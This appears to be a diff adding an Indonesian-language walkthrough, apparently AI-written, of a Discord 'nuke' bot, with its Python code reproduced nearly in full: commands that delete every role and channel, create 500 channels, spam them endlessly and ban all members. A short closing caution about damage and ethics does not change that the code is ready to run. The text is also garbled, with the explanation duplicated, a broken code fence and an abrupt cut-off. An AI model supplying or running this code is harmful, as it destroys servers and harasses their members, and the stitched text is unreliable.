@@ -1,0 +1,344 @@
+Oke, ini adalah kode Python yang dirancang untuk membuat bot Discord yang dapat melakukan tindakan "nuke" dan "ban" pada server Discord.  Mari kita bahas bagian demi bagian:
+
+**1. Import Libraries:**
+
+```python
+from discord.ext import commands
+import threading
+import discord
+import random
+import os,sys
+```
+
+* **`discord.ext.commands`:**  Ini adalah library yang digunakan untuk membuat bot Discord yang responsif terhadap perintah.
+* **`threading`:** Ini digunakan untuk menjalankan tugas secara paralel.
+* **`discord`:** Ini adalah library utama untuk berinteraksi dengan Discord API.
+* **`random`:** Ini digunakan untuk menghasilkan angka acak.
+* **`os, sys`:** Ini digunakan untuk berinteraksi dengan sistem operasi (bersihkan layar, jalankan perintah).
+
+**2. Input Token:**
+
+```python
+tokeninput = f'[>] BOT TOKEN: '
+TOKEN = input(tokeninput)
+```
+
+* Ini meminta pengguna untuk memasukkan token bot Discord mereka. Token ini diperlukan agar bot dapat terhubung ke Discord.
+
+**3. Bersihkan Layar dan Tampilkan Menu:**
+
+```python
+os.system('clear')
+print("JOIN DULU DISCORD PANTEQ")
+os.system('xdg-open https://discord.gg/RrRNW4eN')
+os.system('clear')
+print("PILIH BANGST")
+print('1) Nuke')
+print('2) Ban')
+```
+
+* Ini membersihkan layar terminal, menampilkan pesan untuk bergabung ke Discord, dan kemudian menampilkan menu pilihan: "Nuke" atau "Ban".
+
+**4. Variabel dan Input Pengguna:**
+
+```python
+MAX_CHANNELS = 500
+choice = int(input())
+
+if choice == 1:
+    chanless = input('Channel Nama: ')
+    spam = input('Text Untuk Spam: ')
+    print('Lu ketik: !kontol')
+
+if choice == 2:
+    reason = input('Bans reason: ')
+    print('Untuk Ban satu orang ketik')
+    print('Lu ketik untuk banall: !bandros')
+```
+
+* **`MAX_CHANNELS`:**  Ini menentukan jumlah maksimal channel yang akan dibuat saat melakukan "Nuke".
+* **`choice`:** Ini menyimpan pilihan pengguna (1 untuk "Nuke" atau 2 untuk "Ban").
+* **`chanless`:** Ini menyimpan nama channel yang akan dibuat saat melakukan "Nuke".
+* **`spam`:** Ini menyimpan teks yang akan digunakan untuk spam di channel.
+* **`reason`:** Ini menyimpan alasan untuk ban.
+
+**5. Bot Discord:**
+
+```python
+antinet = commands.Bot(command_prefix="!")
+```
+
+* Ini membuat instance bot Discord bernama `antinet` dengan awalan perintah `!`.
+
+**6. Perintah "Nuke" (`!kontol`):**
+
+```python
+@antinet.command()
+async def kontol(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+
+    # Hapus semua role
+    for role in guild.roles:
+        try:
+            await role.delete()
+            print(f"{role.name} Has been deleted")
+        except:
+            print(f"{role.name} Has not been deleted")
+
+    # Hapus semua channel
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            print(f"{channel.name} Has been deleted")
+        except:
+            print(f'You cant delete {channel}')
+
+    # Buat banyak channel baru
+    try:
+        for i in range(MAX_CHANNELS):
+            await guild.create_text_channel(chanless)
+            print(f"{chanless} has been created")
+    except:
+        print('Anda belum mendapat izin untuk channel')
+```
+
+* **`@antinet.command()`:** Ini mendeklarasikan bahwa fungsi `kontol` adalah perintah bot yang dipicu dengan `!kontol`.
+* **`await ctx.message.delete()`:** Ini menghapus pesan perintah dari chat.
+Oke, ini adalah kode Python yang dirancang untuk membuat bot Discord yang dapat melakukan tindakan "nuke" dan "ban" pada server Discord.  Mari kita bahas bagian demi bagian:
+
+**1. Import Libraries:**
+
+```python
+from discord.ext import commands
+import threading
+import discord
+import random
+import os,sys
+```
+
+* **`discord.ext.commands`:**  Ini adalah library yang digunakan untuk membuat bot Discord yang responsif terhadap perintah.
+* **`threading`:** Ini digunakan untuk menjalankan tugas secara paralel.
+* **`discord`:** Ini adalah library utama untuk berinteraksi dengan Discord API.
+* **`random`:** Ini digunakan untuk menghasilkan angka acak.
+* **`os, sys`:** Ini digunakan untuk berinteraksi dengan sistem operasi (bersihkan layar, jalankan perintah).
+
+**2. Input Token:**
+
+```python
+tokeninput = f'[>] BOT TOKEN: '
+TOKEN = input(tokeninput)
+```
+
+* Ini meminta pengguna untuk memasukkan token bot Discord mereka. Token ini diperlukan agar bot dapat terhubung ke Discord.
+
+**3. Bersihkan Layar dan Tampilkan Menu:**
+
+```python
+os.system('clear')
+print("JOIN DULU DISCORD PANTEQ")
+os.system('xdg-open https://discord.gg/RrRNW4eN')
+os.system('clear')
+print("PILIH BANGST")
+print('1) Nuke')
+print('2) Ban')
+```
+
+* Ini membersihkan layar terminal, menampilkan pesan untuk bergabung ke Discord, dan kemudian menampilkan menu pilihan: "Nuke" atau "Ban".
+
+**4. Variabel dan Input Pengguna:**
+
+```python
+MAX_CHANNELS = 500
+choice = int(input())
+
+if choice == 1:
+    chanless = input('Channel Nama: ')
+    spam = input('Text Untuk Spam: ')
+    print('Lu ketik: !kontol')
+
+if choice == 2:
+    reason = input('Bans reason: ')
+    print('Untuk Ban satu orang ketik')
+    print('Lu ketik untuk banall: !bandros')
+```
+
+* **`MAX_CHANNELS`:**  Ini menentukan jumlah maksimal channel yang akan dibuat saat melakukan "Nuke".
+* **`choice`:** Ini menyimpan pilihan pengguna (1 untuk "Nuke" atau 2 untuk "Ban").
+* **`chanless`:** Ini menyimpan nama channel yang akan dibuat saat melakukan "Nuke".
+* **`spam`:** Ini menyimpan teks yang akan digunakan untuk spam di channel.
+* **`reason`:** Ini menyimpan alasan untuk ban.
+
+**5. Bot Discord:**
+
+```python
+antinet = commands.Bot(command_prefix="!")
+```
+
+* Ini membuat instance bot Discord bernama `antinet` dengan awalan perintah `!`.
+
+**6. Perintah "Nuke" (`!kontol`):**
+
+```python
+@antinet.command()
+async def kontol(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+
+    # Hapus semua role
+    for role in guild.roles:
+        try:
+            await role.delete()
+            print(f"{role.name} Has been deleted")
+        except:
+            print(f"{role.name} Has not been deleted")
+
+    # Hapus semua channel
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            print(f"{channel.name} Has been deleted")
+        except:
+            print(f'You cant delete {channel}')
+
+    # Buat banyak channel baru
+    try:
+        for i in range(MAX_CHANNELS):
+            await guild.create_text_channel(chanless)
+            print(f"{chanless} has been created")
+    except:
+        print('Anda belum mendapat izin untuk channel')
+```
+
+* **`@antinet.command()`:** Ini mendeklarasikan bahwa fungsi `kontol` adalah perintah bot yang dipicu dengan `!kontol`.
+* **`await ctx.message.delete()`:** Ini menghapus pesan perintah dari chat.
+* **`guild = ctx.guild`:** Ini mendapatkan objek server tempat perintah dijalankan.
+* **Hapus Role:**  Kode ini mencoba menghapus semua role di server.
+* **Hapus Channel:**  Kode ini mencoba menghapus semua channel di server.
+* **Buat Channel Baru:** Kode ini mencoba membuat banyak channel baru dengan nama `chanless`.
+
+**7. Perintah "Ban All" (`!bandros`):**
+
+```python
+@antinet.command(pass_context=True)
+async def bandros(ctx):
+    await ctx.message.delete()
+    guild = ctx.message.guild
+    for member in list(client.get_all_members()):
+        try:
+            await guild.ban(member)
+            print("User " + member.name + " has been banned")
+        except:
+            print('Anda belum mendapat izin untuk ban')
+```
+
+* **`@antinet.command(pass_context=True)`:** Ini mendeklarasikan bahwa fungsi `bandros` adalah perintah bot yang dipicu dengan `!bandros`.
+* **`guild = ctx.message.guild`:** Ini mendapatkan objek server tempat perintah dijalankan.
+* **Ban Semua Member:** Kode ini mencoba memban semua member di server.
+
+**8. Perintah "Ban Satu Orang" (`!bandros1`):**
+
+```python
+@antinet.command()
+async def bandros1(ctx, member : discord.Member):
+    await ctx.message.delete()
+    try:
+        await member.ban(reason=reason)
+        print(f'{member} was banned')
+    except:
+        print(f'Anda tidak memiliki izin untuk ban {member}')
+```
+
+* **`@antinet.command()`:** Ini mendeklarasikan bahwa fungsi `bandros1` adalah perintah bot yang dipicu dengan `!bandros1`.
+* **`member : discord.Member`:** Ini mendeklarasikan bahwa argumen pertama untuk perintah ini adalah objek `discord.Member`.
+* **Ban Member:** Kode ini mencoba memban member yang ditentukan sebagai argumen.
+
+**9. Event Spam (`on_guild_channel_create`):**
+
+```python
+@antinet.event
+async def on_guild_channel_create(channel):
+    while True:
+        try:
+            await channel.send(spam)
+            print('SPAMMIMG :)')
+
+        except:
+            print('Anda Tidak Bisa Spamm')
+
+def thread():
+        threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()
+```
+
+* **`@antinet.event`:** Ini mendeklarasikan bahwa fungsi `on_guild_channel_create` adalah event handler yang dipicu saat channel baru dibuat di server.
+* **Spam Channel:** Kode ini terus-menerus mencoba mengirim pesan `spam` ke channel yang baru dibuat.
+
+**10. Jalankan Bot:**
+
+```python
+antinet.run(TOKEN)
+```
+
+* Ini menjalankan bot Discord dengan token yang diberikan.
+
+**Penting:**
+
+* **Kode ini sangat merusak:** Kode ini dirancang untuk melakukan tindakan yang dapat menyebabkan kerusakan serius pada server Discord. Gunakan dengan sangat hati-hati dan hanya pada server yang Anda miliki dan Anda ingin "nuke".
+* **Risiko:**  Menggunakan kode ini dapat menyebabkan akun Anda diblokir atau dihapus dari Discord.
+* **Etika:**  Penting untuk menggunakan bot Discord secara bertanggung jawab dan etis. 
+
+Semoga penjelasan ini membantu! 
+
+
+￼Enter* **`guild = ctx.guild`:** Ini mendapatkan objek server tempat perintah dijalankan.
+* **Hapus Role:**  Kode ini mencoba menghapus semua role di server.
+* **Hapus Channel:**  Kode ini mencoba menghapus semua channel di server.
+* **Buat Channel Baru:** Kode ini mencoba membuat banyak channel baru dengan nama `chanless`.
+
+**7. Perintah "Ban All" (`!bandros`):**
+
+```python
+@antinet.command(pass_context=True)
+async def bandros(ctx):
+    await ctx.message.delete()
+    guild = ctx.message.guild
+    for member in list(client.get_all_members()):
+        try:
+            await guild.ban(member)
+            print("User " + member.name + " has been banned")
+        except:
+            print('Anda belum mendapat izin untuk ban')
+```
+
+* **`@antinet.command(pass_context=True)`:** Ini mendeklarasikan bahwa fungsi `bandros` adalah perintah bot yang dipicu dengan `!bandros`.
+* **`guild = ctx.message.guild`:** Ini mendapatkan objek server tempat perintah dijalankan.
+* **Ban Semua Member:** Kode ini mencoba memban semua member di server.
+
+**8. Perintah "Ban Satu Orang" (`!bandros1`):**
+
+hon
+@antinet.command()
+async def bandros1(ctx, member : discord.Member):
+    await ctx.message.delete()
+    try:
+        await member.ban(reason=reason)
+        print(f'{member} was banned')
+    except:
+        print(f'Anda tidak memiliki izin untuk ban {member}')
+```
+
+* **`@antinet.command()`:** Ini mendeklarasikan bahwa fungsi `bandros1` adalah perintah bot yang dipicu dengan `!bandros1`.
+* **`member : discord.Member`:** Ini mendeklarasikan bahwa argumen pertama untuk perintah ini adalah objek `discord.Member`.
+* **Ban Member:** Kode ini mencoba memban member yang ditentukan sebagai argumen.
+
+**9. Event Spam (`on_guild_channel_create`):**
+
+```python
+@antinet.event
+async def on_guild_channel_create(channel):
+    while True:
+        try:
+            await channel.send(spam)
+            print('SPAMMIMG :)')
+
+        except:
